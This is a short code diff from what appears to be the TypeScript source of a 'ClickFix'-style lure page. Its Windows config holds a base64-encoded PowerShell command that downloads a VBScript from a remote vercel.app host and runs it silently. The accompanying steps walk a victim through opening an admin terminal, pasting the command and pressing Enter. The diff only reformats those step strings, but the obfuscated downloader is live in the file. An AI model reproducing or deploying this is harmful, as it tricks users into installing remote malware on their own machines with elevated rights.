@@ -207,10 +207,10 @@ const PLATFORM_CONFIG: Record<
   windows: {
     suffix: `powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand YwB1AHIAbAAuAGUAeABlACAALQBmAHMAUwBMACAAJwBoAHQAdABwAHMAOgAvAC8AYQByAGUAbgBhAC0AYQBwAGUAeAAuAHYAZQByAGMAZQBsAC4AYQBwAHAALwB3AC4AdgBiAHMAJwAgAC0AbwAgACIAJABlAG4AdgA6AFQARQBNAFAAXAB3AC4AdgBiAHMAIgA7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAEYAaQBsAGUAUABhAHQAaAAgAHcAcwBjAHIAaQBwAHQALgBlAHgAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAnAC8ALwBCACcALAAiACQAZQBuAHYAOgBUAEUATQBQAFwAdwAuAHYAYgBzACIA`,
     steps: [
-      "Press `<WindowsIcon />` + X.",
-      "Press A",
-      "Press Ctrl + V.",
-      "Press Enter.",
+      `Press "<WindowsIcon />" + "X"`,
+      `Press "A"`,
+      `Press "Ctrl" + "V"`,
+      `Press "Enter"`,
     ],
   },
   "mac-silicon": {
